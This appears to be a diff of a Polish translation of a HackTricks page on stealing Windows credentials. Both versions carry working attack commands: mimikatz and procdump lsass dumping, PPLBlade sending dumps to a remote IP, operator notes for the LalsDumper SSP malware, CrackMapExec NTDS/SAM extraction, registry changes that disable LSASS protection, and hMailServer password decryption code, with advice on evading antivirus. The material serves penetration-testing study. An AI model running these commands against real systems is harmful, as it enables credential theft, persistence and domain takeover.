@@ -1,4 +1,4 @@
-# Kradzież poświadczeń Windows
+# Kradzież poświadczeń systemu Windows
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -16,7 +16,7 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**Znajdź inne rzeczy, które Mimikatz potrafi robić, na** [**tej stronie**](credentials-mimikatz.md)**.**
+**Znajdź inne rzeczy, które Mimikatz może robić, na** [**tej stronie**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
 ```bash
@@ -28,7 +28,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 ## Poświadczenia z Meterpreter
 
-Użyj utworzonego przeze mnie [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), aby **wyszukiwać hasła i hashe** wewnątrz zaatakowanego systemu.
+Użyj utworzonego przeze mnie [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), aby **wyszukać hasła i hashe** na komputerze ofiary.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -49,10 +49,10 @@ mimikatz_command -f "lsadump::sam"
 
 ### Procdump + Mimikatz
 
-Ponieważ **Procdump z** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **jest legalnym narzędziem Microsoft**, Defender go nie wykrywa.\
-Możesz użyć tego narzędzia, aby **wykonać dump procesu lsass**, **pobrać dump** i **wyekstrahować** **dane uwierzytelniające lokalnie** z dumpa.
+Ponieważ **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **jest legalnym narzędziem Microsoft**, nie jest wykrywany przez Defender.\
+Możesz użyć tego narzędzia do **dump procesu lsass**, **pobrania dumpu** i **lokalnego wyodrębnienia** **poświadczeń** z dumpu.
 
-Możesz również użyć [SharpDump](https://github.com/GhostPack/SharpDump).
+Możesz także użyć [SharpDump](https://github.com/GhostPack/SharpDump).
 ```bash:Dump lsass
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
@@ -71,14 +71,14 @@ mimikatz # sekurlsa::logonPasswords
 ```
 Ten proces jest wykonywany automatycznie za pomocą [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Uwaga**: Niektóre **AV** mogą **wykrywać** jako **złośliwe** użycie **procdump.exe do zrzutu lsass.exe**, ponieważ **wykrywają** ciągi znaków **"procdump.exe" i "lsass.exe"**. Dlatego bardziej **stealthier** jest przekazanie jako **argumentu** **PID** procesu lsass do procdump **zamiast** **nazwy lsass.exe.**
+**Uwaga**: Niektóre **AV** mogą **wykrywać** jako **złośliwe** użycie **procdump.exe do dumpowania lsass.exe**, ponieważ **wykrywają** ciągi **„procdump.exe” i „lsass.exe”**. Dlatego bardziej **stealthy** jest przekazanie jako **argumentu** **PID-u** lsass.exe do procdump **zamiast** **nazwy lsass.exe.**
 
-### Zrzucanie lsass za pomocą **comsvcs.dll**
+### Dumping lsass za pomocą **comsvcs.dll**
 
-DLL o nazwie **comsvcs.dll**, znajdująca się w `C:\Windows\System32`, odpowiada za **zrzucanie pamięci procesu** w przypadku awarii. Ta DLL zawiera **funkcję** o nazwie **`MiniDumpW`**, zaprojektowaną do wywoływania za pomocą `rundll32.exe`.\
-Użycie dwóch pierwszych argumentów nie ma znaczenia, ale trzeci jest podzielony na trzy elementy. Pierwszy element stanowi identyfikator procesu, który ma zostać zrzucony, druga część określa lokalizację pliku zrzutu, a trzeci element musi być dokładnie słowem **full**. Nie istnieją alternatywne opcje.\
-Po przeanalizowaniu tych trzech elementów DLL tworzy plik zrzutu i przenosi do niego pamięć określonego procesu.\
-Wykorzystanie **comsvcs.dll** umożliwia zrzucenie procesu lsass, eliminując tym samym potrzebę przesyłania i uruchamiania procdump. Ta metoda została szczegółowo opisana na stronie [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+Biblioteka DLL o nazwie **comsvcs.dll**, znajdująca się w `C:\Windows\System32`, odpowiada za **dumpowanie pamięci procesu** w przypadku awarii. Ta biblioteka DLL zawiera **funkcję** o nazwie **`MiniDumpW`**, przeznaczoną do wywoływania za pomocą `rundll32.exe`.\
+Użycie dwóch pierwszych argumentów nie ma znaczenia, natomiast trzeci jest podzielony na trzy komponenty. Pierwszy komponent stanowi identyfikator procesu, który ma zostać zdumpowany, drugi określa lokalizację pliku dump, a trzeci komponent musi być dokładnie słowem **full**. Nie istnieją alternatywne opcje.\
+Po przeanalizowaniu tych trzech komponentów biblioteka DLL tworzy plik dump i przenosi do niego pamięć określonego procesu.\
+Wykorzystanie **comsvcs.dll** umożliwia dumpowanie procesu lsass, eliminując tym samym potrzebę przesyłania i uruchamiania procdump. Ta metoda została szczegółowo opisana na stronie [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>
 
 Do wykonania używane jest następujące polecenie:
 ```bash
@@ -90,7 +90,7 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 
 1. Kliknij prawym przyciskiem myszy pasek zadań i kliknij Menedżer zadań
 2. Kliknij Więcej szczegółów
-3. Na karcie Procesy znajdź proces "Local Security Authority Process"
+3. Na karcie Procesy wyszukaj proces "Local Security Authority Process"
 4. Kliknij prawym przyciskiem myszy proces "Local Security Authority Process" i kliknij "Create dump file".
 
 ### Dumpowanie lsass za pomocą procdump
@@ -102,58 +102,58 @@ Get-Process -Name LSASS
 ```
 ## Zrzucanie lsass za pomocą PPLBlade
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) to narzędzie do zrzucania Protected Process, które obsługuje obfuskowanie memory dump oraz transferowanie go na zdalne stacje robocze bez zapisywania go na dysku.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) to narzędzie do wykonywania dumpów chronionych procesów, które obsługuje obfuskację zrzutu pamięci i przesyłanie go do zdalnych stacji roboczych bez zapisywania go na dysku.
 
-**Kluczowe funkcjonalności**:
+**Najważniejsze funkcje**:
 
 1. Omijanie ochrony PPL
-2. Obfuskowanie plików memory dump w celu uniknięcia mechanizmów wykrywania opartych na sygnaturach Defendera
-3. Uploadowanie memory dump za pomocą metod uploadu RAW i SMB bez zapisywania go na dysku (fileless dump)
+2. Obfuskacja plików zrzutów pamięci w celu uniknięcia mechanizmów Defendera wykrywających sygnatury
+3. Przesyłanie zrzutu pamięci za pomocą metod wysyłania RAW i SMB bez zapisywania go na dysku (dump bez pliku)
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
-## LalsDumper – dumpowanie LSASS oparte na SSP bez MiniDumpWriteDump
+## LalsDumper – zrzucanie LSASS oparte na SSP bez MiniDumpWriteDump
 
-Ink Dragon dostarcza trzyetapowy dumper o nazwie **LalsDumper**, który nigdy nie wywołuje `MiniDumpWriteDump`, dzięki czemu hooki EDR na tym API nigdy się nie uruchamiają:<sup>[[3]](#references)</sup>
+Ink Dragon dostarcza trzyetapowy dumper o nazwie **LalsDumper**, który nigdy nie wywołuje `MiniDumpWriteDump`, więc hooki EDR na tym API nigdy się nie uruchamiają:<sup>[[3]](#references)</sup>
 
-1. **Stage 1 loader (`lals.exe`)** – wyszukuje w `fdp.dll` placeholder składający się z 32 małych liter `d`, zastępuje go absolutną ścieżką do `rtu.txt`, zapisuje zmodyfikowaną bibliotekę DLL jako `nfdp.dll` i wywołuje `AddSecurityPackageA("nfdp","fdp")`. Wymusza to załadowanie przez **LSASS** złośliwej biblioteki DLL jako nowego Security Support Provider (SSP).
-2. **Stage 2 wewnątrz LSASS** – gdy LSASS ładuje `nfdp.dll`, biblioteka DLL odczytuje `rtu.txt`, wykonuje operację XOR na każdym bajcie z użyciem `0x20`, a następnie mapuje zdekodowany blob w pamięci i przekazuje do niego wykonanie.
-3. **Stage 3 dumper** – zmapowany payload ponownie implementuje logikę MiniDump, korzystając z **direct syscalls** rozwiązywanych na podstawie zhashowanych nazw API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Dedykowany export o nazwie `Tom` otwiera `%TEMP%\<pid>.ddt`, zapisuje skompresowany dump LSASS do pliku i zamyka uchwyt, dzięki czemu exfiltracja może nastąpić później.
+1. **Loader Stage 1 (`lals.exe`)** – przeszukuje `fdp.dll` w poszukiwaniu placeholdera składającego się z 32 małych liter `d`, zastępuje go absolutną ścieżką do `rtu.txt`, zapisuje spatchowaną bibliotekę DLL jako `nfdp.dll` i wywołuje `AddSecurityPackageA("nfdp","fdp")`. Wymusza to załadowanie przez **LSASS** złośliwej biblioteki DLL jako nowego Security Support Provider (SSP).
+2. **Stage 2 wewnątrz LSASS** – gdy LSASS ładuje `nfdp.dll`, biblioteka odczytuje `rtu.txt`, wykonuje XOR każdego bajtu z `0x20` i mapuje zdekodowany blob do pamięci przed przekazaniem wykonania.
+3. **Stage 3 dumper** – zmapowany payload odtwarza logikę MiniDump za pomocą **direct syscalls** rozwiązywanych na podstawie zahashowanych nazw API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Dedykowany export o nazwie `Tom` otwiera `%TEMP%\<pid>.ddt`, zapisuje skompresowany dump LSASS do pliku i zamyka handle, dzięki czemu exfiltration może nastąpić później.
 
-Uwagi operatora:
+Uwagi dla operatora:
 
-* Umieść `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` w tym samym katalogu. Stage 1 zastępuje hard-coded placeholder absolutną ścieżką do `rtu.txt`, więc rozdzielenie tych plików przerywa cały łańcuch.
-* Rejestracja odbywa się przez dodanie `nfdp` do `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Możesz samodzielnie ustawić tę wartość, aby LSASS przeładowywał SSP przy każdym uruchomieniu systemu.
-* Pliki `%TEMP%\*.ddt` zawierają skompresowane dumpy. Rozpakuj je lokalnie, a następnie przekaż do Mimikatz/Volatility w celu wyodrębnienia credentials.
-* Uruchomienie `lals.exe` wymaga uprawnień administratora/SeTcb, aby `AddSecurityPackageA` zakończyło się powodzeniem; po zwróceniu przez tę funkcję LSASS w sposób transparentny ładuje rogue SSP i wykonuje Stage 2.
-* Usunięcie biblioteki DLL z dysku nie usuwa jej z LSASS. Usuń wpis rejestru i zrestartuj LSASS (uruchom ponownie system) albo pozostaw go dla długoterminowej persistence.
+* Umieść `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` w tym samym katalogu. Stage 1 zastępuje hard-coded placeholder absolutną ścieżką do `rtu.txt`, więc ich rozdzielenie przerywa cały chain.
+* Rejestracja odbywa się przez dopisanie `nfdp` do `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Możesz samodzielnie wstępnie ustawić tę wartość, aby LSASS przeładowywał SSP przy każdym uruchomieniu systemu.
+* Pliki `%TEMP%\*.ddt` to skompresowane dumpy. Rozpakuj je lokalnie, a następnie przekaż do Mimikatz/Volatility w celu ekstrakcji credentials.
+* Uruchomienie `lals.exe` wymaga uprawnień admin/SeTcb, aby `AddSecurityPackageA` zakończyło się powodzeniem; po zwróceniu wyniku przez wywołanie LSASS transparentnie ładuje rogue SSP i wykonuje Stage 2.
+* Usunięcie biblioteki DLL z dysku nie usuwa jej z LSASS. Usuń wpis w rejestrze i zrestartuj LSASS (reboot) albo pozostaw go w celu długoterminowej persistence.
 
 ## CrackMapExec
 
-### Dumpowanie hashy SAM
+### Zrzucanie hashy SAM
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
-### Zrzucanie sekretów LSA
+### Dumpowanie sekretów LSA
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-### Zrzut NTDS.dit z docelowego kontrolera domeny
+### Zrzut pliku NTDS.dit z docelowego DC
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Zrzut historii haseł NTDS.dit z docelowego kontrolera domeny
+### Zrzut historii haseł z NTDS.dit z docelowego DC
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
-### Wyświetl atrybut pwdLastSet dla każdego konta NTDS.dit
+### Pokaż atrybut pwdLastSet dla każdego konta NTDS.dit
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
 ## Kradzież SAM i SYSTEM
 
-Pliki te powinny znajdować się w _C:\windows\system32\config\SAM_ oraz _C:\windows\system32\config\SYSTEM._ Jednak **nie możesz po prostu skopiować ich w zwykły sposób**, ponieważ są chronione.
+Pliki te powinny znajdować się w _C:\windows\system32\config\SAM_ oraz _C:\windows\system32\config\SYSTEM._ Jednak **nie można po prostu skopiować ich w zwykły sposób**, ponieważ są chronione.
 
 ### Z rejestru
 
@@ -170,11 +170,11 @@ impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
 ### Kopia woluminów w tle
 
-Za pomocą tej usługi możesz kopiować chronione pliki. Musisz mieć uprawnienia Administratora.
+Za pomocą tej usługi można kopiować chronione pliki. Wymagane są uprawnienia Administratora.
 
-#### Using vssadmin
+#### Używanie vssadmin
 
-plik binarny vssadmin jest dostępny tylko w wersjach Windows Server
+Plik binarny vssadmin jest dostępny tylko w wersjach Windows Server
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
@@ -202,25 +202,25 @@ Kod z książki: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sist
 
 ### Invoke-NinjaCopy
 
-Na koniec możesz również użyć [**skryptu PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), aby utworzyć kopię plików SAM, SYSTEM i ntds.dit.
+Na koniec możesz również użyć [**skryptu PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), aby utworzyć kopię SAM, SYSTEM i ntds.dit.
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
 ## **Credentials Active Directory - NTDS.dit**
 
-Plik **NTDS.dit** jest znany jako serce **Active Directory** i przechowuje kluczowe dane o obiektach użytkowników, grupach oraz ich członkostwie. To właśnie w nim przechowywane są **hashes haseł** użytkowników domeny. Ten plik jest bazą danych **Extensible Storage Engine (ESE)** i znajduje się w lokalizacji **_%SystemRoom%/NTDS/ntds.dit_**.
+Plik **NTDS.dit** jest znany jako serce **Active Directory** i przechowuje kluczowe dane dotyczące obiektów użytkowników, grup oraz ich członkostwa. To właśnie w nim przechowywane są **hashes haseł** użytkowników domeny. Ten plik jest bazą danych **Extensible Storage Engine (ESE)** i znajduje się w lokalizacji **_%SystemRoom%/NTDS/ntds.dit_**.
 
 W tej bazie danych utrzymywane są trzy główne tabele:
 
 - **Data Table**: Ta tabela przechowuje szczegóły dotyczące obiektów, takich jak użytkownicy i grupy.
-- **Link Table**: Przechowuje informacje o relacjach, takich jak członkostwo w grupach.
-- **SD Table**: Znajdują się tutaj **descriptors bezpieczeństwa** dla każdego obiektu, zapewniające bezpieczeństwo i kontrolę dostępu do przechowywanych obiektów.
+- **Link Table**: Śledzi relacje, takie jak członkostwo w grupach.
+- **SD Table**: Znajdują się tutaj **security descriptors** każdego obiektu, zapewniające bezpieczeństwo i kontrolę dostępu do przechowywanych obiektów.
 
 Więcej informacji: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)<sup>[[8]](#references)</sup>
 
-Windows używa biblioteki _Ntdsa.dll_ do interakcji z tym plikiem, a korzysta z niej _lsass.exe_. Następnie **część** pliku **NTDS.dit** może znajdować się w pamięci **`lsass`** (prawdopodobnie można znaleźć tam ostatnio używane dane ze względu na poprawę wydajności dzięki użyciu **cache**).
+Windows używa _Ntdsa.dll_ do interakcji z tym plikiem, a plik ten jest używany przez _lsass.exe_. Następnie **część** pliku **NTDS.dit** może znajdować się w pamięci procesu **`lsass`** (prawdopodobnie można znaleźć tam ostatnio uzyskiwane dane ze względu na poprawę wydajności dzięki użyciu **cache**).
 
-#### Odszyfrowywanie hashes w pliku NTDS.dit
+#### Odszyfrowywanie hashes w NTDS.dit
 
 Hash jest szyfrowany 3 razy:
 
@@ -228,7 +228,7 @@ Hash jest szyfrowany 3 razy:
 2. Odszyfrowanie **hash** przy użyciu **PEK** i **RC4**.
 3. Odszyfrowanie **hash** przy użyciu **DES**.
 
-**PEK** ma **taką samą wartość** na **każdym kontrolerze domeny**, ale jest **zaszyfrowany** w pliku **NTDS.dit** przy użyciu **BOOTKEY** z **pliku SYSTEM kontrolera domeny (jest różny dla poszczególnych kontrolerów domeny)**. Dlatego aby uzyskać credentials z pliku NTDS.dit, **potrzebujesz plików NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
+**PEK** ma **tę samą wartość** na **każdym kontrolerze domeny**, ale jest **zaszyfrowany** w pliku **NTDS.dit** przy użyciu **BOOTKEY** z **pliku SYSTEM kontrolera domeny (jest różny na poszczególnych kontrolerach domeny)**. Dlatego aby uzyskać credentials z pliku NTDS.dit, **potrzebujesz plików NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
 
 ### Kopiowanie NTDS.dit przy użyciu Ntdsutil
 
@@ -236,52 +236,52 @@ Dostępne od Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Możesz również użyć sztuczki [**volume shadow copy**](#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że potrzebujesz również kopii pliku **SYSTEM** (ponownie, użyj sztuczki [**zrzucenia go z rejestru lub użycia volume shadow copy**](#stealing-sam-and-system)).
+Możesz również użyć sztuczki [**volume shadow copy**](#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że będziesz również potrzebować kopii pliku **SYSTEM** (ponownie, [**zrzucić go z rejestru lub użyć sztuczki volume shadow copy**](#stealing-sam-and-system)).
 
-### **Ekstrakcja hashy z NTDS.dit**
+### **Wyodrębnianie hashy z NTDS.dit**
 
 Po **uzyskaniu** plików **NTDS.dit** i **SYSTEM** możesz użyć narzędzi takich jak _secretsdump.py_, aby **wyodrębnić hashe**:
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-Możesz także **automatycznie je wyodrębnić** przy użyciu prawidłowego użytkownika administratora domeny:
+Możesz również **automatycznie je wyodrębnić** za pomocą prawidłowego użytkownika administratora domeny:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
-W przypadku **dużych plików NTDS.dit** zaleca się ich wyodrębnianie za pomocą [gosecretsdump](https://github.com/c-sto/gosecretsdump).
+W przypadku **dużych plików NTDS.dit** zaleca się ich wyodrębnienie za pomocą [gosecretsdump](https://github.com/c-sto/gosecretsdump).
 
 Na koniec możesz również użyć **modułu metasploit**: _post/windows/gather/credentials/domain_hashdump_ lub **mimikatz** `lsadump::lsa /inject`
 
 ### **Wyodrębnianie obiektów domeny z NTDS.dit do bazy danych SQLite**
 
-Obiekty NTDS można wyodrębnić do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Wyodrębniane są nie tylko sekrety, ale również całe obiekty i ich atrybuty, co umożliwia dalsze wydobywanie informacji, gdy surowy plik NTDS.dit został już pozyskany.
+Obiekty NTDS można wyodrębnić do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Wyodrębniane są nie tylko sekrety, ale także całe obiekty wraz z ich atrybutami, co umożliwia dalsze wydobywanie informacji, gdy surowy plik NTDS.dit został już pozyskany.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-Hive `SYSTEM` jest opcjonalny, ale umożliwia odszyfrowanie secrets (hashy NT i LM, dodatkowych credentials, takich jak hasła w cleartext, klucze kerberos lub trust, historia haseł NT i LM). Oprócz innych informacji wyodrębniane są następujące dane: konta użytkowników i komputerów wraz z ich hashami, flagi UAC, timestamp ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i rekurencyjne członkostwo, drzewo organizational units i członkostwo, zaufane domeny wraz z typem, kierunkiem i atrybutami trustów...
+Hive `SYSTEM` jest opcjonalny, ale umożliwia odszyfrowanie sekretów (hashy NT i LM, dodatkowych poświadczeń, takich jak hasła w cleartext, klucze Kerberos lub trust, historia haseł NT i LM). Oprócz innych informacji wyodrębniane są następujące dane: konta użytkowników i komputerów wraz z ich hashami, flagi UAC, znaczniki czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i rekurencyjne członkostwa, drzewo jednostek organizacyjnych i członkostwo, zaufane domeny wraz z typem, kierunkiem i atrybutami trustów...
 
-## LaZagne
+## Lazagne
 
-Pobierz binary z [tego miejsca](https://github.com/AlessandroZ/LaZagne/releases). Możesz użyć tego binary do wyodrębniania credentials z kilku programów.
+Pobierz plik binarny z [here](https://github.com/AlessandroZ/LaZagne/releases). Możesz użyć tego pliku binarnego do wyodrębniania poświadczeń z kilku programów.
 ```
 lazagne.exe all
 ```
-## Inne narzędzia do wyodrębniania poświadczeń z SAM i LSASS
+## Inne narzędzia do wyodrębniania danych uwierzytelniających z SAM i LSASS
 
-### Windows Credentials Editor (WCE)
+### Windows credentials Editor (WCE)
 
-To narzędzie może być używane do wyodrębniania poświadczeń z pamięci. Pobierz je z: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+To narzędzie może służyć do wyodrębniania danych uwierzytelniających z pamięci. Pobierz je z: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
-Wyodrębnianie poświadczeń z pliku SAM
+Wyodrębnianie danych uwierzytelniających z pliku SAM
 ```
 You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
 ```
 ### PwDump
 
-Wyodrębnianie poświadczeń z pliku SAM
+Wyodrębnij dane uwierzytelniające z pliku SAM
 ```
 You can find this binary inside Kali, just do: locate pwdump.exe
 PwDump.exe -o outpwdump -x 127.0.0.1
@@ -289,15 +289,15 @@ type outpwdump
 ```
 ### PwDump7
 
-Pobierz go z:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i po prostu **uruchom**, a hasła zostaną wyodrębnione.
+Pobierz go z: [http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i po prostu **execute it**, a hasła zostaną extracted.
 
-## Zbieranie informacji z bezczynnych sesji RDP i osłabianie mechanizmów bezpieczeństwa
+## Mining bezczynnych sesji RDP i osłabianie mechanizmów bezpieczeństwa
 
-FinalDraft RAT od Ink Dragon zawiera tasker `DumpRDPHistory`, którego techniki są przydatne dla każdego red-teamera:<sup>[[3]](#references)</sup>
+FinalDraft RAT firmy Ink Dragon zawiera tasker `DumpRDPHistory`, którego techniki są przydatne dla każdego red-teamera:<sup>[[3]](#references)</sup>
 
 ### Zbieranie telemetrii w stylu DumpRDPHistory
 
-* **Docelowe hosty wychodzących połączeń RDP** – przeanalizuj każdy user hive pod adresem `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Każdy podklucz przechowuje nazwę serwera, `UsernameHint` oraz timestamp ostatniego zapisu. Możesz odtworzyć logikę FinalDraft za pomocą PowerShell:
+* **Docelowe systemy outbound RDP** – przeanalizuj każdy user hive pod adresem `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Każdy podklucz przechowuje nazwę serwera, `UsernameHint` oraz timestamp ostatniej modyfikacji. Możesz odtworzyć logikę FinalDraft za pomocą PowerShell:
 
 ```powershell
 Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
@@ -310,7 +310,7 @@ $user = (Get-ItemProperty $_.Name).UsernameHint
 }
 ```
 
-* **Ślady przychodzących połączeń RDP** – odpytywanie dziennika `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` o Event IDs **21** (pomyślne logowanie) i **25** (rozłączenie) pozwala ustalić, kto administrował hostem:
+* **Dowody inbound RDP** – odczytaj log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pod kątem Event ID **21** (pomyślne logowanie) i **25** (rozłączenie), aby ustalić, kto administrował systemem:
 
 ```powershell
 Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
@@ -318,11 +318,11 @@ Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Op
 | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
 ```
 
-Gdy ustalisz, który Domain Admin regularnie się łączy, wykonaj dump LSASS (za pomocą LalsDumper/Mimikatz), gdy jego **rozłączona** sesja nadal istnieje. CredSSP + fallback NTLM pozostawia jego verifier i tokeny w LSASS, które można następnie odtworzyć przez SMB/WinRM, aby przejąć `NTDS.dit` lub przygotować persistence na kontrolerach domeny.
+Gdy ustalisz, który Domain Admin regularnie się łączy, wykonaj dump LSASS (za pomocą LalsDumper/Mimikatz), gdy jego **disconnected** sesja nadal istnieje. CredSSP + fallback NTLM pozostawia jego verifier i tokeny w LSASS, które można następnie replayować przez SMB/WinRM, aby przejąć `NTDS.dit` lub przygotować persistence na kontrolerach domeny.
 
-### Obniżanie zabezpieczeń rejestru ukierunkowane przez FinalDraft
+### Downgrades rejestru ukierunkowane przez FinalDraft
 
-Ten sam implant modyfikuje również kilka kluczy rejestru, aby ułatwić kradzież poświadczeń:<sup>[[3]](#references)</sup>
+Ten sam implant modyfikuje również kilka kluczy rejestru, aby ułatwić credential theft:<sup>[[3]](#references)</sup>
 ```cmd
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
@@ -331,12 +331,12 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 
 ```
 * Ustawienie `DisableRestrictedAdmin=1` wymusza pełne ponowne użycie poświadczeń/biletów podczas RDP, umożliwiając pivoty w stylu pass-the-hash.
 * `LocalAccountTokenFilterPolicy=1` wyłącza filtrowanie tokenów UAC, dzięki czemu lokalni administratorzy otrzymują nieograniczone tokeny przez sieć.
-* `DSRMAdminLogonBehavior=2` umożliwia administratorowi DSRM logowanie, gdy DC jest online, dając atakującym kolejne wbudowane konto o wysokich uprawnieniach.
-* `RunAsPPL=0` usuwa ochronę LSASS PPL, przez co dostęp do pamięci staje się trywialny dla dumperów, takich jak LalsDumper.
+* `DSRMAdminLogonBehavior=2` pozwala administratorowi DSRM logować się, gdy DC jest online, zapewniając atakującym kolejne wbudowane konto o wysokich uprawnieniach.
+* `RunAsPPL=0` usuwa zabezpieczenia LSASS PPL, sprawiając, że dostęp do pamięci staje się trywialny dla dumperów, takich jak LalsDumper.
 
-## Poświadczenia bazy danych hMailServer (po przejęciu)
+## Poświadczenia bazy danych hMailServer (po uzyskaniu dostępu)
 
-hMailServer przechowuje hasło do DB w pliku `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` w sekcji `[Database] Password=`. Wartość jest zaszyfrowana algorytmem Blowfish przy użyciu statycznego klucza `THIS_KEY_IS_NOT_SECRET` oraz zamiany endianowości 4-bajtowych słów. Użyj ciągu szesnastkowego z pliku INI wraz z tym fragmentem Pythona:<sup>[[2]](#references)</sup>
+hMailServer przechowuje hasło do DB w `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` w sekcji `[Database] Password=`. Wartość jest zaszyfrowana algorytmem Blowfish przy użyciu statycznego klucza `THIS_KEY_IS_NOT_SECRET` oraz zamian endianowości 4-bajtowych słów. Użyj ciągu szesnastkowego z pliku INI wraz z tym fragmentem Python:<sup>[[2]](#references)</sup>
 ```python
 from Crypto.Cipher import Blowfish
 import binascii
@@ -349,7 +349,7 @@ key = b"THIS_KEY_IS_NOT_SECRET"
 plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
 print(plain.decode())
 ```
-Mając hasło w clear-text, skopiuj bazę danych SQL CE, aby uniknąć blokad pliku, załaduj 32-bitowy provider i w razie potrzeby wykonaj upgrade przed odpytywaniem hashy:
+Mając hasło w postaci jawnego tekstu, skopiuj bazę danych SQL CE, aby uniknąć blokad plików, załaduj dostawcę 32-bitowego i w razie potrzeby wykonaj aktualizację przed wykonaniem zapytania o hashe:
 ```powershell
 Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
 Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
@@ -358,38 +358,38 @@ $engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
